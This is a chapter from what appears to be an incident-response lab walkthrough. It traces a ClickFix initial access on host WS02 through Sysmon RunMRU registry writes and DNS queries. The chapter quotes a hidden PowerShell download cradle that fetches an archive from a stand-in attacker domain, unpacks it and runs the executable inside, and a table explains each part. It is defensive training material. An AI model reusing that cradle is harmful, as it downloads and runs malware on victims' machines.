---
title: "2. Initial access"
---

<p class="lb-kicker">Chapter 2 · Q003 to Q004</p>

# Initial access

<p class="lb-lede">Explorer started PowerShell directly. Users rarely do that by clicking. So how was it launched? Windows keeps a record of exactly what was typed into the Run dialog, and so does Sysmon.</p>

## What was typed into Run? <span class="q-ref">Q003</span> { #q003 }

When a user presses ++win+r++ and runs something, Explorer writes the command to the `RunMRU` registry key. Sysmon logs that write as event 13 (registry value set).

```bql
event_id="13" target_object=~"\\RunMRU\\" | target_object!=/MRUList$/ | sort(timestamp) | table(timestamp, computer_name, image, details)
```
<!-- shot: q003-runmru | Everything typed into the Run dialog, oldest first. | rows=3 -->

Three entries, all on WS02, all written by Explorer. The first lands at **14:02:27.543**, within milliseconds of the PowerShell process from chapter 1:

```text
powershell -w h -c "$t=$env:temp;iwr 'https://update-cache-m9tdco18phmc.com/a/.../pkg?...' -o $t\q;
  tar xf $t\q -C $t;saps $t\QuickConnect\QuickConnectSupport.exe"
```

A hidden one-line download cradle, pasted into the Run box by the user. That is the signature of a fake "verify you are human" or "fix this error" page that copies a command to the clipboard and tells the victim to press ++win+r++, ++ctrl+v++, ++enter++.

!!! finding "Finding · Q003"
    The technique is **ClickFix** (ATT&CK [T1204.004](https://attack.mitre.org/techniques/T1204/004/), Malicious Copy and Paste). The `\1` at the end of each value is an MRU marker, not part of the command.

The other two entries, at 14:22 and 14:51, come later. Hold that thought until [chapter 4](04-hands-on-keyboard.md).

## What did it download? <span class="q-ref">Q004</span> { #q004 }

Read the cradle piece by piece:

| Part | Does |
|---|---|
| `powershell -w h` | Runs PowerShell with a hidden window |
| `iwr '...' -o $t\q` | `Invoke-WebRequest`: downloads a file named `pkg` to `%TEMP%\q` |
| `tar xf $t\q -C $t` | Unpacks it with the built-in `tar.exe` |
| `saps $t\QuickConnect\QuickConnectSupport.exe` | `Start-Process`: runs what was unpacked |

Sysmon saw PowerShell resolve the download domain:

```bql
bifract_category="dns_query" query=~update-cache | groupBy(computer_name, image, query, function=min(timestamp))
```
<!-- shot: q004-dns | PowerShell resolves the download domain at 14:02:26. | rows=4 -->

!!! finding "Finding · Q004"
    Explorer launched **powershell.exe** to download and unpack the initial bundle from `update-cache-m9tdco18phmc.com`.

!!! warning "Do not visit"
    `update-cache-m9tdco18phmc.com` is a fictional domain. Do not resolve or browse to it.

Next: [what came out of that bundle](03-loader.md).
